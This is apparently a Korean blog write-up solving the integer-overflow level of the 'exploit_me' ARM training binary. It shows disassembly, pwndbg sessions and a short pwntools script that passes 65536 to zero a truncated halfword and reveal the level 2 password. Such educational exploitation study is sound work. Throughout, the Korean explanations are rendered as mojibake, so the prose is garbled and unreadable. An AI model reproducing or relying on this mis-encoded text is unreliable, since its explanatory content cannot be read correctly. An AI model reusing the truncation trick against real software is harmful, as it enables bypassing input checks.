---
title: "[pwnable] ARM exploit ì •ë¦¬"
excerpt: "exploit_me"

categories:
  - pwn
tags:
  - [pwnable, exploit]

permalink: /pwn/exploit_me/

toc: true
toc_sticky: true

date: 2024-12-18
last_modified_at: 2024-12-18
---

githubì— arm exploitì„ ì •ë¦¬í•˜ê¸°ì— ì¢‹ì€ ì˜ˆì œê°€ ìˆì–´ì„œ ì´ë¥¼ ì´ìš©í•´ì„œ ì •ë¦¬í•´ë³´ê³ ì í•©ë‹ˆë‹¤.

ğŸ‘‰ğŸ» [exploit_me](https://github.com/bkerler/exploit_me.git)

m1 macì—ì„œ ì§„í–‰í•˜ì§€ë§Œ pwnable í™˜ê²½ ìì²´ê°€ linux x64 í™˜ê²½ì´ê¸° ë•Œë¬¸ì— qemuë¥¼ ì´ìš©í•˜ì—¬ ì§„í–‰í•˜ì˜€ìŠµë‹ˆë‹¤.

ğŸ‘‰ğŸ» [qemu ì •ë¦¬](https://parkhoho.github.io/pwn/qemu/)

## â˜ğŸ» ì •ìˆ˜ ì˜¤ë²„í”Œë¡œìš°
mainì„ disassembleí•´ë³´ë©´ int_overflow í•¨ìˆ˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.

ì´ í•¨ìˆ˜ê°€ level2 passwordì˜ íŒíŠ¸ë‹¤.
> ì°¸ê³ ë¡œ level1 passwordì˜ ê²½ìš° ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰ì‹œí‚¤ë©´ ì°¾ì„ ìˆ˜ ìˆë‹¤.

```
qemu-aarch64-static -L /usr/aarch64-linux-gnu/ -g 8888 ./exploit64 hello 11111
```

11111ì´ë¼ëŠ” ê°’ì„ ì¤¬ê³ , ì´ 11111ì„ ì–´ë–»ê²Œ ì²˜ë¦¬í•˜ëŠ”ì§€ ì‚´í´ë³´ì.



```asm
0x0000000000401490 <+0>:	stp	x29, x30, [sp, #-48]!
0x0000000000401494 <+4>:	mov	x29, sp
0x0000000000401498 <+8>:	str	x0, [sp, #24]
0x000000000040149c <+12>:	ldr	x0, [sp, #24]
0x00000000004014a0 <+16>:	bl	0x4171b8 <atoi>
0x00000000004014a4 <+20>:	str	w0, [sp, #44]
0x00000000004014a8 <+24>:	ldr	w0, [sp, #44]
0x00000000004014ac <+28>:	str	w0, [sp, #40]
0x00000000004014b0 <+32>:	ldr	w0, [sp, #40]
0x00000000004014b4 <+36>:	cmp	w0, #0x0
0x00000000004014b8 <+40>:	b.ne	0x4014d0 <_Z12int_overflowPc+64>  // b.any
0x00000000004014bc <+44>:	adrp	x0, 0x470000 <_nl_archive_subfreeres+104>
0x00000000004014c0 <+48>:	add	x0, x0, #0x7e8
0x00000000004014c4 <+52>:	bl	0x425e30 <puts>
0x00000000004014c8 <+56>:	mov	w0, #0x0                   	// #0
0x00000000004014cc <+60>:	bl	0x417b30 <exit>
0x00000000004014d0 <+64>:	ldr	w0, [sp, #44]
0x00000000004014d4 <+68>:	strh	w0, [sp, #38]
0x00000000004014d8 <+72>:	ldrh	w0, [sp, #38]
0x00000000004014dc <+76>:	cmp	w0, #0x0
0x00000000004014e0 <+80>:	b.eq	0x401500 <_Z12int_overflowPc+112>  // b.none
0x00000000004014e4 <+84>:	ldrh	w0, [sp, #38]
0x00000000004014e8 <+88>:	mov	w1, w0
0x00000000004014ec <+92>:	adrp	x0, 0x470000 <_nl_archive_subfreeres+104>
```


int_overflowì˜ disassembleí•œ ì½”ë“œë‹¤.

1. `stp x29,x30,[sp,#-48]!` `mov x29,sp`ë¥¼ í†µí•´ ìŠ¤íƒ ì •ë¦¬
2. `str x0,[sp,#24]`,`ldr x0,[sp,#24]`ë¥¼ í†µí•´ ê°’ì„ ê°€ì ¸ì˜¨ë‹¤.
3. atoië¥¼ ì´ìš©í•˜ì—¬ ê°’ì„ ì½ìŒ
4. ì´ ê°’ì„ 0ê³¼ ë¹„êµí•˜ì—¬ ê°™ì§€ ì•Šìœ¼ë©´ ì²«ë²ˆì§¸ branchë¥¼ í†µê°€í•˜ê²Œ ëœë‹¤.(ê°™ìœ¼ë©´ exit)
5. ì´í›„ ë‹¤ì‹œ ì¬ë°°ì—´í•œ ê°’ì„ ê°€ì ¸ì™€ì„œ 0ê³¼ ê°™ìœ¼ë©´ jmp í•œë‹¤.(0ê³¼ ê°™ì§€ ì•Šìœ¼ë©´ exit)
6. ì¦‰, ì…ë ¥í•œ ê°’ì´ 0ì´ê±°ë‚˜ 0ë³´ë‹¤ ì‘ì•„ì•¼ í•œë‹¤.


ì´ë•Œ 11111ë¥¼ í†µí•´ ë‚´ë¶€ì—ì„œ ì–´ë–¤ ê²°ê³¼ê°€ ë‚˜ì˜¤ëŠ”ì§€ í™•ì¸í•´ë³´ì.


```bash
b *int_overflow
c
```

ì´ë•Œ ë‚˜ì˜¤ëŠ” ê²°ê³¼ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.

```assembly
  0x401490 <int_overflow(char*)>       stp    x29, x30, [sp, #-0x30]!       <main+224>
  0x401494 <int_overflow(char*)+4>     mov    x29, sp
  0x401498 <int_overflow(char*)+8>     str    x0, [sp, #0x18]
  0x40149c <int_overflow(char*)+12>    ldr    x0, [sp, #0x18]
  0x4014a0 <int_overflow(char*)+16>    bl     #atoi                     <atoi>

  0x4014a4 <int_overflow(char*)+20>    str    w0, [sp, #0x2c]
  0x4014a8 <int_overflow(char*)+24>    ldr    w0, [sp, #0x2c]
  0x4014ac <int_overflow(char*)+28>    str    w0, [sp, #0x28]
  0x4014b0 <int_overflow(char*)+32>    ldr    w0, [sp, #0x28]
  0x4014b4 <int_overflow(char*)+36>    cmp    w0, #0
  0x4014b8 <int_overflow(char*)+40>    b.ne   #int_overflow(char*)+64                     <int_overflow(char*)+64>
  ...
```


ì´ë•Œ ì•„ê¹Œ ì„¤ëª…í•œ ì¡°ê±´ë“¤ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ breakpointë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì¤€ë‹¤.
```
b *int_overflow+40
b *int_overflow+80
b *int_overflow+120
```


continue í•œ í›„ì— w0ì˜ ê°’ì„ í™•ì¸í•´ë³´ì.

```bash
c
```

```bash
pwndbg> info r w0
w0             0x2b67              11111
```


ì¦‰ w0ì—ëŠ” 11111ì˜ hexê°’ì¸ 0x2b67ì´ ë“¤ì–´ê°€ ìˆë‹¤.


ë”°ë¼ì„œ w0ì´ 0ë³´ë‹¤ í¬ê¸° ë•Œë¬¸ì— jmpë¥¼ í•˜ê²Œ ëœë‹¤.

ë‹¤ìŒ ì¡°ê±´ìœ¼ë¡œëŠ” ê·¸ ê°’ì„ ë‹¤ì‹œ ê°€ì ¸ì™€ 0ê³¼ ë¹„êµë¥¼ í•˜ê²Œ ëœë‹¤.


ì´ë•Œ w0ì€ ì•„ê¹Œì™€ ë§ˆì°¬ê°€ì§€ë¡œ 0x2b67ì´ ë“¤ì–´ê°€ìˆê¸° ë•Œë¬¸ì— jmpë¥¼ í•˜ì§€ ëª»í•œë‹¤.


ë”°ë¼ì„œ ë‹¤ìŒê³¼ ê°™ì´ printf()ì™€ exitë¥¼ ë§Œë‚˜ í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œê°€ ëœë‹¤.

```assembly
0x4014e4 <int_overflow(char*)+84>     ldrh   w0, [sp, #0x26]
 â–º 0x4014e8 <int_overflow(char*)+88>     mov    w1, w0
   0x4014ec <int_overflow(char*)+92>     adrp   x0, #_nl_archive_subfreeres+104 <0x470000>
   0x4014f0 <int_overflow(char*)+96>     add    x0, x0, #0x810
   0x4014f4 <int_overflow(char*)+100>    bl     #printf                     <printf>

   0x4014f8 <int_overflow(char*)+104>    mov    w0, #0
   0x4014fc <int_overflow(char*)+108>    bl     #exit                     <exit>
```

ì¦‰, ì›í•˜ëŠ” ê°’ì„ ì–»ê¸° ìœ„í•´ì„œëŠ” w0ì— 0ì„ ë„£ì–´ì•¼ í•œë‹¤.
í•˜ì§€ë§Œ ì…ë ¥ê°’ì— 0ì„ ë„£ê²Œ ë˜ë©´ passwordë¥¼ ì–»ì§€ ëª»í•˜ê¸° ë•Œë¬¸ì— ë‹¤ë¥¸ ë°©ì‹ì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤.

## í•´ê²°ë°©ë²•
ë‹¤ìŒì€ int_overflowì˜ ë™ì‘ê³¼ì • ì¤‘ í•˜ë‚˜ì´ë‹¤.

ì´ë•Œ `strh`ì™€ `ldrh` ëª…ë ¹ì–´ë¥¼ í†µí•´ w0ì— íŠ¹ì • ê°’ì„ ì €ì¥í•˜ê³  ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

```assembly
0x4014d0 <int_overflow(char*)+64>    ldr    w0, [sp, #0x2c]
0x4014d4 <int_overflow(char*)+68>    strh   w0, [sp, #0x26]
0x4014d8 <int_overflow(char*)+72>    ldrh   w0, [sp, #0x26]
â–º 0x4014dc <int_overflow(char*)+76>    cmp    w0, #0
0x4014e0 <int_overflow(char*)+80>    b.eq   #int_overflow(char*)+112                     <int_overflow(char*)+112>
```

`strh`ê³¼ `ldrh`ëŠ” halfword í¬ê¸°ë§Œí¼ì„ ì €ì¥í•˜ê³  ë¡œë“œí•˜ëŠ” ëª…ë ¹ì–´ë‹¤.

ğŸ‘‰ğŸ» [ì°¸ê³ ](https://developer.arm.com/documentation/ddi0406/c/Application-Level-Architecture/Instruction-Details/Alphabetical-list-of-instructions/LDRH--immediate--Thumb-?lang=en)


ê·¸ë ‡ê¸°ì— 2^16 ê°’ì„ ë„£ê²Œ ëœë‹¤ë©´ 0ì´ ì €ì¥ë˜ê²Œ ëœë‹¤.


ë‹¤ìŒì€ 2^16ì„ ì…ë ¥ìœ¼ë¡œ í•˜ì—¬ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•œ ê²°ê³¼ë‹¤.

```
pwndbg> b *int_overflow+80
```

```
0x4014cc <int_overflow(char*)+60>     bl     #exit                     <exit>

   0x4014d0 <int_overflow(char*)+64>     ldr    w0, [sp, #0x2c]
   0x4014d4 <int_overflow(char*)+68>     strh   w0, [sp, #0x26]
   0x4014d8 <int_overflow(char*)+72>     ldrh   w0, [sp, #0x26]
   0x4014dc <int_overflow(char*)+76>     cmp    w0, #0
 â–º 0x4014e0 <int_overflow(char*)+80>     b.eq   #int_overflow(char*)+112                     <int_overflow(char*)+112>
    â†“
   0x401500 <int_overflow(char*)+112>    ldr    w0, [sp, #0x2c]
   0x401504 <int_overflow(char*)+116>    cmp    w0, #0
   0x401508 <int_overflow(char*)+120>    b.lt   #int_overflow(char*)+136                     <int_overflow(char*)+136>

   0x40150c <int_overflow(char*)+124>    ldrh   w0, [sp, #0x26]
   0x401510 <int_overflow(char*)+128>    cmp    w0, #0
```

```bash
pwndbg> info r w0
w0             0x0                 0
```

## PoC
Expoit Codeë¥¼ ì œì‘í•´ë³´ì.
```python
~
"exploit.py" 15L, 317B                                        7,0-1         All
from pwn import *

def lv1():
    args_lv1 = "65536"
    p = process(['./exploit64', 'hello', args_lv1])
    print(p.recvline())

if __name__ == "__main__":
    lv1()
```
```bash
hoho@hoho:~/exploit_me/bin$ python3 ./exploit.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/hoho/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.13.1)
[+] Starting local process './exploit64': pid 1515
b'Level 2 Password: "help"\n'
[*] Stopped process './exploit64' (pid 1515)
```

ìœ„ì™€ ê°™ì´ Level 2 Passwordë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.
